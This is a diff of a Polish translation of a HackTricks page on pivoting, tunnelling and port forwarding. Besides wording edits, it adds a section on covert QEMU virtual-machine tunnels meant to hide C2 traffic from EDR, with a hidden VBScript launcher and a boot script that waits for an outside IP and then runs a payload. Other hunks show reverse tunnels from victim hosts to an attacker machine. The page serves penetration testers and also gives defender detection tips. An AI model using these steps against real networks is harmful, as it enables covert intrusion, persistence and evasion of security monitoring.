@@ -2,10 +2,10 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Wskazówka Nmap
 
 > [!WARNING]
-> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skany TCP** (`-sT`), aby to działało.
+> **Skanowanie ICMP** i **SYN** nie może być tunelowane przez proxy socks, więc musimy **wyłączyć odkrywanie ping** (`-Pn`) i określić **skanowanie TCP** (`-sT`), aby to działało.
 
 ## **Bash**
 
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Bezpieczeństwo – Atak Terrapin (CVE-2023-48795)**
-> Atak degradacyjny Terrapin z 2023 roku może pozwolić atakującemu typu man-in-the-middle na manipulację wczesnym handshake'em SSH i wstrzykiwanie danych do **dowolnego przekazywanego kanału** ( `-L`, `-R`, `-D` ). Upewnij się, że zarówno klient, jak i serwer są załatane (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub wyraźnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config`, zanim polegasz na tunelach SSH.
+> Atak downgrade Terrapin z 2023 roku może pozwolić atakującemu typu man-in-the-middle na manipulację wczesnym handshake'iem SSH i wstrzykiwanie danych do **dowolnego przekazywanego kanału** ( `-L`, `-R`, `-D` ). Upewnij się, że zarówno klient, jak i serwer są załatane (**OpenSSH ≥ 9.6/LibreSSH 6.7**) lub wyraźnie wyłącz podatne algorytmy `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` w `sshd_config`/`ssh_config`, zanim polegasz na tunelach SSH.
 
 ## SSHUTTLE
 
-Możesz **tunelować** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
-Na przykład, przekazywanie całego ruchu kierowanego do 10.10.10.0/24
+Możesz **tunele** przez **ssh** cały **ruch** do **podsieci** przez hosta.\
+Na przykład, przekazywanie całego ruchu idącego do 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -138,7 +138,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otwórz port w serwerze zespołu nasłuchujący na wszystkich interfejsach, który może być używany do **przekierowywania ruchu przez beacon**.
+Otwórz port w serwerze zespołowym nasłuchującym na wszystkich interfejsach, który może być używany do **przekierowywania ruchu przez beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -149,12 +149,12 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze Team Server, a ruch jest wysyłany do serwera Team Server, a stamtąd do wskazanego hosta:port
+> W tym przypadku **port jest otwarty na hoście beacon**, a nie na serwerze Team Server, a ruch jest wysyłany do serwera Team Server, a stamtąd do wskazanego host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Aby zauważyć:
+Do zauważenia:
 
 - Odwrócone przekierowanie portów Beacona jest zaprojektowane do **tunnelingu ruchu do Serwera Zespołu, a nie do przekazywania między poszczególnymi maszynami**.
 - Ruch jest **tunnelowany w ramach ruchu C2 Beacona**, w tym linków P2P.
@@ -172,13 +172,13 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Musisz przesłać plik webowy tunel: ashx|aspx|js|jsp|php|php|jsp
+Musisz przesłać plik tunelowy: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
 ## Chisel
 
-Możesz go pobrać z strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Możesz go pobrać ze strony wydań [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
 Musisz używać **tej samej wersji dla klienta i serwera**
 
 ### socks
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To jak konsolowa wersja PuTTY (opcje są bardzo podobne do klienta ssh).
 
-Ponieważ ten plik binarny będzie wykonywany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
+Ponieważ ten plik binarny będzie uruchamiany na ofierze i jest klientem ssh, musimy otworzyć naszą usługę ssh i port, abyśmy mogli uzyskać połączenie zwrotne. Następnie, aby przekierować tylko lokalnie dostępny port na port w naszej maszynie:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -368,18 +368,18 @@ Teraz potwierdź na swoim urządzeniu (atakującym), że port 1080 nasłuchuje:
 ```
 netstat -antb | findstr 1080
 ```
-Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxy'owania ruchu przez ten port.**
+Teraz możesz użyć [**Proxifier**](https://www.proxifier.com/) **do proxyzowania ruchu przez ten port.**
 
-## Proxify aplikacje GUI Windows
+## Proxyzowanie aplikacji GUI w systemie Windows
 
-Możesz sprawić, że aplikacje GUI Windows będą korzystać z proxy, używając [**Proxifier**](https://www.proxifier.com/).\
-W **Profile -> Proxy Servers** dodaj IP i port serwera SOCKS.\
-W **Profile -> Proxification Rules** dodaj nazwę programu do proxy'owania oraz połączenia do IP, które chcesz proxy'ować.
+Możesz sprawić, że aplikacje GUI w systemie Windows będą korzystać z proxy za pomocą [**Proxifier**](https://www.proxifier.com/).\
+W **Profile -> Proxy Servers** dodaj adres IP i port serwera SOCKS.\
+W **Profile -> Proxification Rules** dodaj nazwę programu do proxyzowania oraz połączenia do adresów IP, które chcesz proxyzować.
 
 ## Ominięcie proxy NTLM
 
 Wcześniej wspomniane narzędzie: **Rpivot**\
-**OpenVPN** również może to obejść, ustawiając te opcje w pliku konfiguracyjnym:
+**OpenVPN** może również to obejść, ustawiając te opcje w pliku konfiguracyjnym:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -446,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Zmień DNS w proxychains
 
-Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnym serwerem DNS, którego używa proxychains, jest **4.2.2.2** (wpisane na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **środowisku Windows**, możesz ustawić adres IP **kontrolera domeny**.
+Proxychains przechwytuje wywołanie `gethostbyname` w libc i tuneluje zapytania DNS tcp przez proxy socks. Domyślnie serwer DNS, który używa proxychains, to **4.2.2.2** (wpisany na stałe). Aby go zmienić, edytuj plik: _/usr/lib/proxychains3/proxyresolv_ i zmień adres IP. Jeśli jesteś w **środowisku Windows**, możesz ustawić adres IP **kontrolera domeny**.
 
 ## Tunelowanie w Go
 
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **to narzędzie do eksponowania rozwiązań w Internecie w jednej linii poleceń.**\
-_URI eksponowania wygląda jak:_ **UID.ngrok.io**
+_Adresy URI eksponujące są jak:_ **UID.ngrok.io**
 
 ### Instalacja
 
@@ -529,7 +529,7 @@ Bezpośrednio z stdout lub w interfejsie HTTP [http://127.0.0.1:4040](http://127
 ```
 #### ngrok.yaml prosty przykład konfiguracji
 
-Otwiera 3 tunele:
+Otwiera 3 tunel:
 
 - 2 TCP
 - 1 HTTP z ekspozycją statycznych plików z /tmp/httpbin/
@@ -561,7 +561,7 @@ cloudflared tunnel --url http://localhost:8080
 cloudflared tunnel --url socks5://localhost:1080 --socks5
 # Now configure proxychains to use 127.0.0.1:1080
 ```
-### Trwałe tunelowanie z DNS
+### Trwałe tunele z DNS
 ```bash
 cloudflared tunnel create mytunnel
 cloudflared tunnel route dns mytunnel internal.example.com
@@ -574,11 +574,11 @@ Rozpocznij łącznik:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Ponieważ cały ruch opuszcza hosta **wychodząc przez 443**, tunelowanie Cloudflared to prosty sposób na obejście ACL-ów przychodzących lub granic NAT. Należy pamiętać, że binarka zazwyczaj działa z podwyższonymi uprawnieniami – używaj kontenerów lub flagi `--user`, gdy to możliwe.
+Ponieważ cały ruch opuszcza host **wychodzący przez 443**, tunelowanie Cloudflared to prosty sposób na obejście ACL-ów przychodzących lub granic NAT. Należy pamiętać, że binarka zazwyczaj działa z podwyższonymi uprawnieniami – używaj kontenerów lub flagi `--user`, gdy to możliwe.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) to aktywnie utrzymywany proxy odwrotne w Go, które obsługuje **TCP, UDP, HTTP/S, SOCKS i P2P NAT-hole-punching**. Począwszy od **v0.53.0 (maj 2024)** może działać jako **SSH Tunnel Gateway**, dzięki czemu docelowy host może uruchomić odwrotny tunel, używając tylko standardowego klienta OpenSSH – nie jest wymagana dodatkowa binarka.
+[`frp`](https://github.com/fatedier/frp) to aktywnie utrzymywany proxy odwrotne w Go, które obsługuje **TCP, UDP, HTTP/S, SOCKS i P2P NAT-hole-punching**. Począwszy od **v0.53.0 (maj 2024)**, może działać jako **SSH Tunnel Gateway**, dzięki czemu docelowy host może uruchomić odwrotny tunel, używając tylko standardowego klienta OpenSSH – nie jest wymagana dodatkowa binarka.
 
 ### Klasyczny odwrotny tunel TCP
 ```bash
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Powyższe polecenie publikuje port ofiary **8080** jako **attacker_ip:9000** bez wdrażania dodatkowych narzędzi – idealne do pivotingu w trybie living-off-the-land.
+Powyższe polecenie publikuje port ofiary **8080** jako **attacker_ip:9000** bez wdrażania dodatkowych narzędzi – idealne do pivotowania w trybie living-off-the-land.
+
+## Tajne tunelowanie oparte na VM z QEMU
+
+Sieciowanie w trybie użytkownika QEMU (`-netdev user`) obsługuje opcję o nazwie `hostfwd`, która **wiąże port TCP/UDP na *hoście* i przekazuje go do *gościa***. Gdy gość uruchamia pełny demon SSH, reguła hostfwd daje ci jednorazowy serwer SSH, który żyje całkowicie wewnątrz efemerycznej VM – idealne do ukrywania ruchu C2 przed EDR, ponieważ wszystkie złośliwe działania i pliki pozostają na wirtualnym dysku.
+
+### Szybka linia komend
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Polecenie powyżej uruchamia obraz **Tiny Core Linux** (`tc.qcow2`) w RAM.
+• Port **2222/tcp** na hoście Windows jest przezroczysto przekazywany do **22/tcp** wewnątrz gościa.
+• Z punktu widzenia atakującego cel po prostu udostępnia port 2222; wszelkie pakiety, które go osiągną, są obsługiwane przez serwer SSH działający w VM.
+
+### Uruchamianie w sposób ukryty za pomocą VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Uruchomienie skryptu za pomocą `cscript.exe //B update.vbs` utrzymuje okno w ukryciu.
+
+### Utrzymywanie w gości
+
+Ponieważ Tiny Core jest bezstanowy, atakujący zazwyczaj:
+
+1. Umieszczają ładunek w `/opt/123.out`
+2. Dodają do `/opt/bootlocal.sh`:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Dodają `home/tc` i `opt` do `/opt/filetool.lst`, aby ładunek został spakowany do `mydata.tgz` podczas zamykania.
+
+### Dlaczego to unika wykrycia
+
+• Tylko dwa niesigned executables (`qemu-system-*.exe`) dotykają dysku; nie są instalowane żadne sterowniki ani usługi.
+• Produkty zabezpieczające na hoście widzą **nieszkodliwy ruch loopback** (rzeczywisty C2 kończy się wewnątrz VM).
+• Skany pamięci nigdy nie analizują przestrzeni procesów złośliwych, ponieważ żyje ona w innym systemie operacyjnym.
+
+### Wskazówki dla Defendera
+
+• Alarmuj na **nieoczekiwane binaria QEMU/VirtualBox/KVM** w ścieżkach zapisywalnych przez użytkownika.
+• Blokuj połączenia wychodzące, które pochodzą z `qemu-system*.exe`.
+• Poluj na rzadkie porty nasłuchujące (2222, 10022, …) wiążące się natychmiast po uruchomieniu QEMU.
+
+---
 
 ## Inne narzędzia do sprawdzenia
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## Odniesienia
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
